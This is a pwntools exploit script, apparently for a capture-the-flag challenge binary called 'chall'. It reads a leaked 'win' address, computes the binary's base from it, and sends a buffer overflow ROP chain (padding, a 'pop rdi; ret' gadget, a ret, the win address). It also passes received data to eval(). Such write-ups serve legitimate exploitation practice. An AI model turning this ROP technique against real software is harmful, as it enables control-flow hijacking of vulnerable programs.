from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendline(content)
    
    def read_leak(self):
        p = self.p
        p.recvuntil(b"How about reading a leak? ")
        return eval(p.recvline())

x, p = init()


x.debug()

win_leak = x.read_leak()
log.info(f"{win_leak}")

exe.address = win_leak - exe.sym['win']

pay = cyclic(32+8)
pay += p64(ROP(exe).find_gadget(['pop rdi', 'ret'])[0])
pay += p64(0xdeadbeef)
pay += p64(ROP(exe).find_gadget(['ret'])[0])
pay += p64(win_leak)

x.send(pay)

p.interactive()